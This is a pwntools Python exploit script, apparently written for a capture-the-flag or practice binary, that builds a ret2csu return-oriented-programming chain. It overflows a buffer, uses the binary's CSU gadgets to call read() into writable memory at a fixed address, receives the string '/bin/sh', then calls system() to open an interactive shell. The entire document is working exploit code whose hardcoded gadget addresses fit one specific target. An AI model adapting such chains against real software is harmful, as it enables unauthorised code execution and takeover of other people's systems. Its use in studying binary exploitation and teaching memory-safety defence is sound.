from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = ''' 
break *0x40071a
continue '''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
system = e.sym['system']
read = e.got['read']
writeable_mem = 0x601068

p = start()

log.info('Sending Ret2CSU Chain')

chain = cyclic(16)              # padding for overflow
chain += p64(0x40071a)          # first gadget
chain += p64(0x0)
chain += p64(0x1)
chain += p64(read)              # r12 = e.got['read']->read()
chain += p64(0x0)               # rdi = stdin = 0x0
chain += p64(writeable_mem)     # rsi = writable_mem
chain += p64(0x8)               # rdx = 0x8
chain += p64(0x400700)          # second gadget
chain += cyclic(8)*7            # padding for after call

chain += p64(pop_rdi)           # pop rdi; ret
chain += p64(writeable_mem)     # rdi = writeable_mem -> '/bin/sh'
chain += p64(system)            # system('/bin/sh')

log_chain = '''
chain = cyclic(16)              # padding for overflow
chain += p64(0x40071a)          # first gadget
chain += p64(0x0)
chain += p64(0x1)
chain += p64(read)              # r12 = e.got['read']->read()
chain += p64(0x0)               # rdi = stdin = 0x0
chain += p64(writeable_mem)     # rsi = writable_mem
chain += p64(0x8)               # rdx = 0x8
chain += p64(0x400700)          # second gadget
chain += cyclic(8)*7            # padding for after call

chain += p64(pop_rdi)           # pop rdi; ret
chain += p64(writeable_mem)     # rdi = writeable_mem -> '/bin/sh'
chain += p64(system)            # system('/bin/sh')
'''
log.info('Sending %s' %log_chain)

p.sendline(chain)

log.info("Hit [Enter] to Send '/bin/sh\0'")
pause()
p.sendline(b'/bin/sh\0')

log.info("Here is your shell >>> ")
p.interactive()
